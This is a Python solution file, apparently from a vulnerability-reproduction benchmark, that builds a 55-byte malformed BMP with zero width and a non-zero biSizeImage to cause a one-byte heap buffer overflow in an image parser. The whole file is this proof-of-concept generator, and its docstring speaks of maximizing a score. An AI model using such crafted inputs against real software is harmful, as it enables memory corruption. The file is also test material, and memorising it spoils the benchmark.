import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability description indicates an issue with processing images
        that have a width or height of zero. This can lead to incorrect memory
        allocations, specifically a heap buffer overflow.

        This PoC constructs a malformed BMP (Bitmap) file with a width of 0.
        The exploit strategy relies on a common flaw in image parsers:
        1. The memory for the pixel buffer is allocated based on the image's
           dimensions (width * height * bytes_per_pixel). With width=0, this
           results in a zero-sized (or very small) allocation.
        2. The parser then attempts to read the pixel data from the file. A flaw
           would be to trust a different field, like `biSizeImage` in the BMP
           header, for the size of the data to read.
        3. By setting `biSizeImage` to a non-zero value and providing that much
           data, we can cause the parser to write past the end of the small
           buffer allocated in step 1, triggering a heap buffer overflow.

        To maximize the score, we create the smallest possible PoC that can
        reliably trigger the crash. A 1-byte overflow is sufficient for AddressSanitizer
        (ASan) to detect the violation. The resulting PoC is 55 bytes long.
        """

        # A 1-byte overflow is minimal and effective for sanitizer detection.
        overflow_data_len = 1

        # Standard BMP header size: 14-byte file header + 40-byte info header.
        header_size = 54
        
        total_size = header_size + overflow_data_len

        # Construct the BITMAPFILEHEADER (14 bytes)
        file_header = b'BM'  # Signature
        file_header += struct.pack('<I', total_size)       # bfSize: Total file size
        file_header += b'\x00\x00\x00\x00'                 # bfReserved1, bfReserved2: Reserved
        file_header += struct.pack('<I', header_size)      # bfOffBits: Offset to pixel data

        # Construct the BITMAPINFOHEADER (40 bytes)
        dib_header = struct.pack('<I', 40)                 # biSize: Header size
        dib_header += struct.pack('<i', 0)                 # biWidth: 0 (the vulnerability trigger)
        dib_header += struct.pack('<i', 1)                 # biHeight: 1
        dib_header += struct.pack('<H', 1)                 # biPlanes: Must be 1
        dib_header += struct.pack('<H', 24)                # biBitCount: 24 bits per pixel
        dib_header += struct.pack('<I', 0)                 # biCompression: BI_RGB (no compression)
        dib_header += struct.pack('<I', overflow_data_len) # biSizeImage: Trusted for read size
        dib_header += struct.pack('<i', 0)                 # biXPelsPerMeter
        dib_header += struct.pack('<i', 0)                 # biYPelsPerMeter
        dib_header += struct.pack('<I', 0)                 # biClrUsed
        dib_header += struct.pack('<I', 0)                 # biClrImportant

        # Provide the single byte that will be written out of bounds.
        overflow_data = b'\x00' * overflow_data_len

        # Combine headers and overflow data to form the final PoC.
        poc = file_header + dib_header + overflow_data
        
        return poc